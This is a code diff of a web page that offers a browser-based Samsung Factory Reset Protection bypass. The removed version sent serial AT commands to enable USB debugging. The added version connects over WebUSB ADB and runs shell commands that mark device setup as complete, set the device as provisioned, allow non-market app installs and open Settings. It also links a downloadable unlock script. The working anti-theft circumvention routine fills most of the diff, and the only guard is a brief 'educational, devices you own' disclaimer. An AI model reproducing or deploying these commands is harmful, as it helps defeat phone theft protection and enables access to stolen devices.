@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="webadb.js"></script>
     <title>Samsung FRP Bypass from the Browser | Sudo-Self</title>
     <link rel="icon" href="/favicon.ico" sizes="any">
     <link rel="apple-touch-icon" href="/apple-touch-icon.png">
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="webadb.js"></script>
     <style>
         body {
             background: linear-gradient(45deg, #1e293b, #0f172a);
@@ -32,6 +32,9 @@
             border-radius: 8px;
             transition: 0.3s;
             color: #fff;
+            border: none;
+            cursor: pointer;
+            margin: 5px;
         }
         .btn-primary {
             background: linear-gradient(135deg, #3b82f6, #9333ea);
@@ -47,6 +50,20 @@
             background: #2563eb;
             transform: scale(1.05);
         }
+        .warning {
+            color: #ef4444;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .status-connected {
+            color: #10b981;
+            font-weight: bold;
+        }
+        .status-disconnected {
+            color: #ef4444;
+            font-weight: bold;
+        }
+        ul { padding-left: 20px; }
     </style>
 </head>
 <body class="bg-gradient-to-r from-gray-800 to-black">
@@ -59,116 +76,175 @@
         <a class="github-button" href="https://github.com/sudo-self/samsung-frp-browser" data-color-scheme="light" data-icon="octicon-star" data-size="large">Star</a>
     </div>
 
+    <!-- USB Debugging Section -->
     <div class="container mx-auto p-6 bg-gray-900 rounded-lg shadow-lg mb-8">
-        <h1 class="text-3xl text-indigo-400 font-extrabold mb-4">Enable USB</h1>
+        <h1 class="text-3xl text-indigo-400 font-extrabold mb-4">Enable USB Debugging</h1>
         <div class="flex justify-center mb-4">
             <button id="connectButton" class="btn-primary">Connect Device USB</button>
         </div>
         <div class="flex justify-center mb-4">
-            <button onclick="sendAllCommands()" class="btn-secondary">Enable</button>
+            <button id="sendCommandsButton" class="btn-secondary">Enable USB Debugging</button>
         </div>
-        <h3 class="text-xl text-gray-300 font-bold">not working? try a different USB port</h3>
+        <h3 class="text-xl text-gray-300 font-bold">Not working? Try a different USB port</h3>
+        <div class="warning">Note: This requires a device in Download Mode or with OEM dialer codes enabled</div>
         <div id="log" class="log"></div>
     </div>
 
+    <!-- ADB & FRP Section -->
     <div class="container mx-auto p-6 bg-gray-900 rounded-lg shadow-lg mb-8">
         <h1 class="text-3xl text-indigo-400 font-extrabold mb-4">Bypass FRP</h1>
         <div class="flex justify-center mb-4">
-            <button id="connectToPhone" class="btn-primary">Connect Device USB</button>
+            <button id="connectAdbButton" class="btn-primary">Connect via ADB</button>
+            <span id="adbStatus" class="status-disconnected">Disconnected</span>
         </div>
         <div class="flex justify-center mb-4">
-            <button onclick="sendAllCommandsAdb()" class="btn-secondary">Unlock</button>
+            <button id="bypassFrpButton" class="btn-secondary">Bypass FRP</button>
         </div>
         <h3 class="text-xl text-gray-300 font-bold">frp.sudo-self.com</h3>
+        <div class="warning">Note: USB Debugging must be enabled on the device first</div>
         <div id="logadb" class="log"></div>
     </div>
 
+    <!-- Device Info & Progress Section -->
+    <div class="container mx-auto p-6 bg-gray-900 rounded-lg shadow-lg mb-8">
+        <h1 class="text-3xl text-indigo-400 font-extrabold mb-4">Device Info & Progress</h1>
+        <div id="deviceInfo" class="text-gray-300 mb-4">Device not connected</div>
+        <ul id="commandProgress" class="list-disc list-inside text-green-400"></ul>
+    </div>
+
+    <!-- Footer Section -->
     <div class="container mx-auto p-6 text-center bg-gray-900 rounded-lg shadow-lg">
         <p class="text-2xl text-pink-500 font-bold mb-4">
             <a href="https://unlock.JesseJesse.com" target="_blank" class="text-pink-400 hover:underline">Bypass Software</a>
         </p>
         <center><img src="./support.png" width="200px" height="auto"></center>
-        <p class="text-pink-500 font-bold mb-4 cursor-pointer" onclick="alert('This is tool for educational purposes only. Made for use on devices you own. I am not responsible for damges and data loss is likely to occur.')">Warning!</p>
+        <p class="text-pink-500 font-bold mb-4 cursor-pointer" onclick="alert('This is tool for educational purposes only. Made for use on devices you own. I am not responsible for damages and data loss is likely to occur.')">Warning!</p>
     </div>
 
     <script>
-        let port = null, reader = null, writer = null;
-        let readableStreamClosed = null, writableStreamClosed = null;
+        let adbDevice = null;
+        let adbConnected = false;
 
-        async function sendCommand(command) {
-            if (!writer) {
-                log('Not connected.');
+        function logAdb(message) {
+            const logElement = document.getElementById('logadb');
+            logElement.innerHTML += message + '<br>';
+            logElement.scrollTop = logElement.scrollHeight;
+        }
+
+        function updateAdbStatus() {
+            const statusElement = document.getElementById('adbStatus');
+            statusElement.textContent = adbConnected ? 'Connected' : 'Disconnected';
+            statusElement.className = adbConnected ? 'status-connected' : 'status-disconnected';
+        }
+
+        function updateDeviceInfo(info) {
+            document.getElementById('deviceInfo').textContent = info;
+        }
+
+        function addCommandProgress(command, success = true) {
+            const ul = document.getElementById('commandProgress');
+            const li = document.createElement('li');
+            li.textContent = command;
+            li.style.color = success ? '#10b981' : '#ef4444';
+            ul.appendChild(li);
+        }
+
+        async function connectAdb() {
+            if (!navigator.usb) {
+                logAdb('WebUSB not supported. Use Chrome or Edge.');
                 return;
             }
-            log(`Sending: ${command}`);
-            await writer.write(command);
-            await new Promise(resolve => setTimeout(resolve, 500));
-        }
 
-        async function sendAllCommands() {
-            const commands = [
-                'AT+KSTRINGB=0,3\r\n',
-                'AT+DUMPCTRL=1,0\r\n',
-                'AT+DEBUGLVC=0,5\r\n',
-                'AT+SWATD=0\r\n',
-                'AT+ACTIVATE=0,0,0\r\n',
-                'AT+SWATD=1\r\n'
-            ];
-            for (let command of commands) {
-                await sendCommand(command);
-            }
-        }
-
-        function log(message) {
-            document.getElementById('log').innerHTML += message + '<br>';
-        }
-
-        async function connectSerial() {
             try {
-                port = await navigator.serial.requestPort();
-                await port.open({ baudRate: 115200 });
+                logAdb('Requesting ADB device...');
+                adbDevice = await Adb.open('WebUSB');
+                await adbDevice.connectAdb('host::');
+                adbConnected = true;
+                updateAdbStatus();
+                logAdb('✅ ADB connected!');
 
-                const textDecoder = new TextDecoderStream();
-                readableStreamClosed = port.readable.pipeTo(textDecoder.writable);
-                const textEncoder = new TextEncoderStream();
-                writableStreamClosed = textEncoder.readable.pipeTo(port.writable);
+                // Display basic device info
+                const model = await executeAdbCommand('getprop ro.product.model') || 'Unknown';
+                const androidVersion = await executeAdbCommand('getprop ro.build.version.release') || 'Unknown';
+                const deviceName = await executeAdbCommand('getprop ro.product.device') || 'Unknown';
+                updateDeviceInfo(`Model: ${model}, Android: ${androidVersion}, Device: ${deviceName}`);
 
-                reader = textDecoder.readable.getReader();
-                writer = textEncoder.writable.getWriter();
-
-                log('Connected to serial port');
-                readLoop();
             } catch (err) {
-                log(`Error: ${err.message}`);
+                logAdb(`❌ Connection failed: ${err.message}`);
+                adbConnected = false;
+                updateAdbStatus();
+                updateDeviceInfo('Device not connected');
             }
         }
 
-        async function readLoop() {
-            while (true) {
-                const { value, done } = await reader.read();
-                if (done) {
-                    reader.releaseLock();
-                    break;
+        async function executeAdbCommand(command) {
+            if (!adbConnected || !adbDevice) {
+                logAdb('⚠️ Not connected to ADB device');
+                return '';
+            }
+            try {
+                logAdb(`> ${command}`);
+                const stream = await adbDevice.shell(command);
+                let output = '';
+                for await (const data of stream) {
+                    output += new TextDecoder().decode(data);
                 }
-                log(`Received: ${value}`);
+                await stream.close();
+                logAdb(output.trim());
+                return output.trim();
+            } catch (err) {
+                logAdb(`❌ Command error: ${err.message}`);
+                return '';
             }
         }
 
-        document.getElementById('connectButton').addEventListener('click', connectSerial);
+        async function bypassFrp() {
+            if (!adbConnected) {
+                logAdb('⚠️ Connect via ADB first');
+                return;
+            }
+
+            const commands = [
+                'settings put global setup_wizard_has_run 1',
+                'settings put secure user_setup_complete 1',
+                'content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1',
+                'content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1',
+                'content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1',
+                'am start -c android.intent.category.HOME -a android.intent.action.MAIN',
+                'am start -n com.android.settings/com.android.settings.Settings'
+            ];
+
+            document.getElementById('commandProgress').innerHTML = '';
+            logAdb('⚡ Starting FRP bypass...');
+
+            for (const cmd of commands) {
+                try {
+                    await executeAdbCommand(cmd);
+                    addCommandProgress(cmd, true);
+                    await new Promise(r => setTimeout(r, 1000));
+                } catch {
+                    addCommandProgress(cmd, false);
+                }
+            }
+            logAdb('✅ FRP bypass commands completed. You may reboot your device now.');
+        }
+
+        // Event listeners
+        document.getElementById('connectAdbButton').addEventListener('click', connectAdb);
+        document.getElementById('bypassFrpButton').addEventListener('click', bypassFrp);
     </script>
 
-  <footer class="bg-gray-900 text-gray-400 p-4 mt-8 text-center">
-    <p class="text-sm">samsung-frp-browser</p>
-    <p class="text-sm"><a href="https://github.com/sudo-self/samsung-frp-browser" class="text-gray-200 hover:underline">source code</a></p>
-    <p class="text-sm mt-2">
-        <a href="https://github.com/sudo-self/samsung-frp-browser/raw/main/unlock.bat" 
-           class="text-blue-400 hover:underline" 
-           download>
-           Unlock Script
-        </a>
-    </p>
-</footer>
-
+    <footer class="bg-gray-900 text-gray-400 p-4 mt-8 text-center">
+        <p class="text-sm">samsung-frp-browser</p>
+        <p class="text-sm"><a href="https://github.com/sudo-self/samsung-frp-browser" class="text-gray-200 hover:underline">source code</a></p>
+        <p class="text-sm mt-2">
+            <a href="https://github.com/sudo-self/samsung-frp-browser/raw/main/unlock.bat"
+               class="text-blue-400 hover:underline"
+               download>
+               Unlock Script
+            </a>
+        </p>
+    </footer>
 
     <script async defer src="https://buttons.github.io/buttons.js"></script>
 </body>
